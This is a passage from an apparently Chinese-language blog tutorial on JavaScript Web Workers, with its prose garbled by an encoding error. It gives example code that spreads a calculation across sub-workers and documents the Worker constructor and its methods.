<span class="token keyword">var</span> pending_workers <span class="token operator">=</span> num_workers<span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_workers<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">'core.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>i <span class="token operator">*</span> items_per_worker<span class="token punctuation">)</span><span class="token punctuation">;</span>
  worker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> items_per_worker<span class="token punctuation">)</span><span class="token punctuation">;</span>
  worker<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> storeResult<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// handle the results</span>
<span class="token keyword">function</span> <span class="token function">storeResult</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  result <span class="token operator">+=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  pending_workers <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>pending_workers <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">postMessage</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// finished!</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒWorker çº¿ç¨‹å†…éƒ¨æ–°å»ºäº†10ä¸ª Worker çº¿ç¨‹ï¼Œå¹¶ä¸”ä¾æ¬¡å‘è¿™10ä¸ª Worker å‘é€æ¶ˆæ¯ï¼Œå‘ŠçŸ¥äº†è®¡ç®—çš„èµ·ç‚¹å’Œç»ˆç‚¹ã€‚è®¡ç®—ä»»åŠ¡è„šæœ¬çš„ä»£ç å¦‚ä¸‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// core.js</span>
<span class="token keyword">var</span> start<span class="token punctuation">;</span>
onmessage <span class="token operator">=</span> getStart<span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">getStart</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  start <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  onmessage <span class="token operator">=</span> getEnd<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> end<span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">getEnd</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  end <span class="token operator">=</span> event<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  onmessage <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// perform some complex calculation here</span>
    result <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">postMessage</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><h2 id="_7-api"><a href="#_7-api" class="header-anchor">#</a> 7.API</h2> <h3 id="ä¸»çº¿ç¨‹-2"><a href="#ä¸»çº¿ç¨‹-2" class="header-anchor">#</a> ä¸»çº¿ç¨‹</h3> <p>æµè§ˆå™¨åŸç”Ÿæä¾›<code>Worker()</code>æ„é€ å‡½æ•°ï¼Œç”¨æ¥ä¾›ä¸»çº¿ç¨‹ç”Ÿæˆ Worker çº¿ç¨‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> myWorker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span>jsUrl<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>Worker()</code>æ„é€ å‡½æ•°ï¼Œå¯ä»¥æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è„šæœ¬çš„ç½‘å€ï¼ˆå¿…é¡»éµå®ˆåŒæºæ”¿ç­–ï¼‰ï¼Œè¯¥å‚æ•°æ˜¯å¿…éœ€çš„ï¼Œä¸”åªèƒ½åŠ è½½ JS è„šæœ¬ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯é…ç½®å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯é€‰ã€‚å®ƒçš„ä¸€ä¸ªä½œç”¨å°±æ˜¯æŒ‡å®š Worker çš„åç§°ï¼Œç”¨æ¥åŒºåˆ†å¤šä¸ª Worker çº¿ç¨‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// ä¸»çº¿ç¨‹</span>
<span class="token keyword">var</span> myWorker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">'worker.js'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> name <span class="token operator">:</span> <span class="token string">'myWorker'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Worker çº¿ç¨‹</span>
self<span class="token punctuation">.</span>name <span class="token comment">// myWorker</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><code>Worker()</code>æ„é€ å‡½æ•°è¿”å›ä¸€ä¸ª Worker çº¿ç¨‹å¯¹è±¡ï¼Œç”¨æ¥ä¾›ä¸»çº¿ç¨‹æ“ä½œ Workerã€‚Worker çº¿ç¨‹å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•å¦‚ä¸‹ã€‚</p> <ul><li>Worker.onerrorï¼šæŒ‡å®š error äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li>Worker.onmessageï¼šæŒ‡å®š message äº‹ä»¶çš„ç›‘å¬å‡½æ•°ï¼Œå‘é€è¿‡æ¥çš„æ•°æ®åœ¨<code>Event.data</code>å±æ€§ä¸­ã€‚</li> <li>Worker.onmessageerrorï¼šæŒ‡å®š messageerror äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚å‘é€çš„æ•°æ®æ— æ³•åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ã€‚</li> <li>Worker.postMessage()ï¼šå‘ Worker çº¿ç¨‹å‘é€æ¶ˆæ¯ã€‚</li> <li>Worker.terminate()ï¼šç«‹å³ç»ˆæ­¢ Worker çº¿ç¨‹ã€‚</li></ul> <h3 id="worker-çº¿ç¨‹-2"><a href="#worker-çº¿ç¨‹-2" class="header-anchor">#</a> Worker çº¿ç¨‹</h3> <p>Web Worker æœ‰è‡ªå·±çš„å…¨å±€å¯¹è±¡ï¼Œä¸æ˜¯ä¸»çº¿ç¨‹çš„<code>window</code>ï¼Œè€Œæ˜¯ä¸€ä¸ªä¸“é—¨ä¸º Worker å®šåˆ¶çš„å…¨å±€å¯¹è±¡ã€‚å› æ­¤å®šä¹‰åœ¨<code>window</code>ä¸Šé¢çš„å¯¹è±¡å’Œæ–¹æ³•ä¸æ˜¯å…¨éƒ¨éƒ½å¯ä»¥ä½¿ç”¨ã€‚</p> <p>Worker çº¿ç¨‹æœ‰ä¸€äº›è‡ªå·±çš„å…¨å±€å±æ€§å’Œæ–¹æ³•ã€‚</p> <ul><li>self.nameï¼š Worker çš„åå­—ã€‚è¯¥å±æ€§åªè¯»ï¼Œç”±æ„é€ å‡½æ•°æŒ‡å®šã€‚</li> <li>self.onmessageï¼šæŒ‡å®š<code>message</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚</li> <li>self.onmessageerrorï¼šæŒ‡å®š messageerror äº‹ä»¶çš„ç›‘å¬å‡½æ•°ã€‚å‘é€çš„æ•°æ®æ— æ³•åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ã€‚</li> <li>self.close()ï¼šå…³é—­ Worker çº¿ç¨‹ã€‚</li> <li>self.postMessage()ï¼šå‘äº§ç”Ÿè¿™ä¸ª Worker çº¿ç¨‹å‘é€æ¶ˆæ¯ã€‚</li> <li>self.importScripts()ï¼šåŠ è½½ JS è„šæœ¬ã€‚</li></ul></div></div> <div class="page-edit"><!----> <!----> <div class="last-updated"><span class="prefix">ä¸Šæ¬¡æ›´æ–°:</span> <span class="time">2020/06/16, 23:06:00</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/337d30/" data-tooltip="äº‹ä»¶" class="page-nav-centre page-nav-centre-prev"></a> <a href="/pages/b7c9f6/" data-tooltip="ECMAScript 6 ç®€ä»‹" class="page-nav-centre page-nav-centre-next"></a> <div class="tooltip" style="display:none;">æé«˜å­¦ä¹ æ•ˆç‡çš„ç­–ç•¥</div></div> <div class="page-nav"><p class="inner"><span class="prev">
        â†
        <a href="/pages/337d30/" class="prev">äº‹ä»¶</a></span> <span class="next"><a href="/pages/b7c9f6/">ECMAScript 6 ç®€ä»‹</a>
        â†’
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-shizhong">æœ€è¿‘æ›´æ–°</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/a1c782/"><div>Vueé€ è½®å­</div></a> <span>07-31</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/d72d13/"><div>å‰ç«¯é¢è¯•Vueå°ç»“</div></a> <span>07-31</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/1d65ad/"><div>å‰ç«¯é¢è¯•é¢˜ç›®å°ç»“</div></a> <span>07-30</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">æ›´å¤šæ–‡ç« &gt;</a></dt></dl></div></div> </main></div> <div class="footer" data-v-7797fcdd><div class="icons" data-v-7797fcdd><a href="mailto:981815087@qq.com" title="å‘é‚®ä»¶" target="_blank" class="iconfont icon-youjian" data-v-7797fcdd></a><a href="https://github.com/leefaith" title="GitHub" target="_blank" class="iconfont icon-github" data-v-7797fcdd></a><a href="https://music.163.com/" title="å¬éŸ³ä¹" target="_blank" class="iconfont icon-erji" data-v-7797fcdd></a></div> 
  Theme by <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="æœ¬ç«™ä¸»é¢˜" data-v-7797fcdd>Vdoing</a> 
     | Copyright Â© 2020-2020
    <span data-v-7797fcdd>Jennifer | <a href="https://github.com/leefaith" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="è¿”å›é¡¶éƒ¨" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="å»è¯„è®º" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="ä¸»é¢˜æ¨¡å¼" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          è·Ÿéšç³»ç»Ÿ
        </li><li class="iconfont icon-rijianmoshi">
          æµ…è‰²æ¨¡å¼
        </li><li class="iconfont icon-yejianmoshi">
          æ·±è‰²æ¨¡å¼
        </li><li class="iconfont icon-yuedu">
          é˜…è¯»æ¨¡å¼
        </li></ul></div></div> <div class="body-bg" style="background:url(/img/background.jpg) center center / cover no-repeat;"></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.20513e73.js" defer></script><script src="/assets/js/2.b1ded945.js" defer></script><script src="/assets/js/126.6fbc34b9.js" defer></script>
  </body>
</html>